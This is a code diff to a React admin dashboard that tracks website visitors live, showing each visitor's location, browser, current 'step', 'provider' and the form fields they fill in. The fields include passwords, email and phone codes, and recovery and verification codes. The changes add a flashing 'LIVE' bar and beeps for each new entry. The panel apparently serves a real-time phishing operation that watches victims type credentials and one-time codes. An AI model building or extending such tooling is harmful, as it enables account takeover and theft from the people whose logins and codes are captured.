@@ -793,6 +793,7 @@ export default function AdminPage() {
   const wsRef = useRef<WebSocket | null>(null);
   const [siteActive, setSiteActiveState] = useState<boolean | null>(null);
   const [recentUpdates, setRecentUpdates] = useState<Set<string>>(new Set());
+  const [lastEvents, setLastEvents] = useState<Record<string, { field: string; value: string; ts: number }>>({});
   const recentTimers = useRef<Record<string, ReturnType<typeof setTimeout>>>({});
   const audioCtxRef = useRef<AudioContext | null>(null);
   const lastBeepRef = useRef<Record<string, number>>({});
@@ -965,6 +966,9 @@ export default function AdminPage() {
             });
           } else if (msg.type === 'visitor-left' && msg.id) {
             setVisitors(prev => prev.map(v => v.id === msg.id ? { ...v, online: false } : v));
+          } else if (msg.type === 'visitor-location' && msg.id) {
+            const loc = (msg as unknown as { id: string; location: { city: string; country: string; countryCode: string; flag: string } }).location;
+            setVisitors(prev => prev.map(v => v.id === msg.id ? { ...v, location: loc } : v));
           } else if (msg.type === 'visitor-updated' && msg.id) {
             setVisitors(prev => prev.map(v =>
               v.id === msg.id ? { ...v, step: msg.step ?? v.step, provider: msg.provider ?? v.provider } : v
@@ -979,6 +983,7 @@ export default function AdminPage() {
                 formHistory: [...(v.formHistory ?? []), entry],
               } : v
             ));
+            setLastEvents(prev => ({ ...prev, [msg.id!]: { field: msg.field!, value: msg.value ?? '', ts: entry.ts } }));
             markRecentUpdate(msg.id);
           } else if (msg.type === 'visitor-form-data-deleted' && msg.id) {
             setVisitors(prev => prev.map(v => {
@@ -1492,18 +1497,36 @@ export default function AdminPage() {
                 const hasData = dataEntries.length > 0;
                 const isSens = (f: string) => ['password','reg_password','email_code','rec_code','reg_verify_code','phone_code','verification_code'].includes(f);
                 const isRecent = recentUpdates.has(v.id);
+                const lastEvent = lastEvents[v.id] ?? null;
+                const lastField = lastEvent?.field ?? null;
+                const lastValue = lastEvent?.value ?? null;
+                const isSensField = lastField ? isSens(lastField) : false;
                 return (
                   <div
                     key={v.id}
                     className={`rounded-xl border overflow-hidden flex flex-col transition-all cursor-pointer group
                       ${isRecent
-                        ? 'border-amber-500/60 bg-[#16181d] shadow-[0_0_0_2px_rgba(245,158,11,0.18)]'
+                        ? 'border-amber-400 bg-[#16181d] shadow-[0_0_0_3px_rgba(251,191,36,0.25),0_0_20px_rgba(251,191,36,0.1)]'
                         : v.online
                           ? 'border-[#2d3139] bg-[#16181d] hover:border-[#3a3f4a] hover:bg-[#1a1d24]'
                           : 'border-[#1e2128] bg-[#13151a] opacity-60'
                       }`}
                     onClick={() => openModal(v.ip)}
                   >
+                    {/* Live-update flash bar */}
+                    {isRecent && lastField && (
+                      <div className="flex items-center gap-2 px-3 py-1.5 bg-amber-500/20 border-b border-amber-500/30 animate-pulse">
+                        <span className="w-1.5 h-1.5 rounded-full bg-amber-400 flex-shrink-0" />
+                        <span className="text-[10px] font-bold text-amber-300 uppercase tracking-wider flex-shrink-0">
+                          {FIELD_LABELS[lastField] ?? lastField}
+                        </span>
+                        <span className="text-[10px] font-mono text-amber-200 truncate">
+                          {isSensField ? '•'.repeat(Math.min((lastValue ?? '').length, 10)) : (lastValue || '—')}
+                        </span>
+                        <span className="ml-auto text-[9px] text-amber-500 flex-shrink-0 font-semibold">LIVE</span>
+                      </div>
+                    )}
+
                     {/* Card header */}
                     <div className="flex items-start gap-3 px-4 pt-4 pb-3">
                       <div className="relative flex-shrink-0">
@@ -1527,13 +1550,15 @@ export default function AdminPage() {
                             </span>
                           )}
                         </div>
-                        <div className="text-[11px] text-[#8a919e] mt-1">{v.location.flag} {v.location.city}, {v.location.country}</div>
+                        <div className="text-[11px] text-[#8a919e] mt-1">
+                          {v.location.city ? `${v.location.flag} ${v.location.city}, ${v.location.country}` : <span className="text-[#3e4450]">Locating…</span>}
+                        </div>
                         <div className="text-[10px] text-[#555d6b] mt-0.5">{vUA.browser} · {vUA.os}</div>
                       </div>
                       <div className="flex-shrink-0 text-right">
                         {isRecent && (
                           <div className="flex items-center justify-end gap-1 mb-1">
-                            <span className="w-2 h-2 rounded-full bg-amber-400 animate-pulse shadow-[0_0_6px_rgba(245,158,11,0.8)]" title="Recent activity" />
+                            <span className="w-2.5 h-2.5 rounded-full bg-amber-400 animate-[pulse_0.6s_ease-in-out_infinite] shadow-[0_0_8px_rgba(251,191,36,1)]" />
                           </div>
                         )}
                         <div className="text-[10px] font-mono text-[#555d6b]">
